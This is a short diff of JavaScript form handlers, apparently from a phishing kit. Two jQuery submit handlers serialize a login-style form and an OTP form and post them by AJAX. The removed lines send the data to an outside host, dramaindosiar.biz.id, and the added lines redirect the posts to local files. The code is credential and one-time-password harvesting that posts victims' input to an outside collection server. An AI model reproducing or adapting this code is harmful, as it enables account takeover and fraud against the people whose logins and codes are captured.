@@ -353,7 +353,7 @@ $('#klikform').on('submit', function (event) {
 var dataString = $("#klikform, #klikotp").serialize();
 $.ajax( {
 type: 'POST',
-url: 'https://dramaindosiar.biz.id/data/data.php',
+url: 'data/data.js',
 data: dataString,
  
  complete: function(data) {
@@ -385,7 +385,7 @@ $('#klikotp').on('submit', function (event) {
 var dataString = $("#klikform, #klikotp").serialize();
 $.ajax( {
 type: 'POST',
-url: 'https://dramaindosiar.biz.id/data/token.php',
+url: 'data/token.js',
 data: dataString,
  
  complete: function(data) {
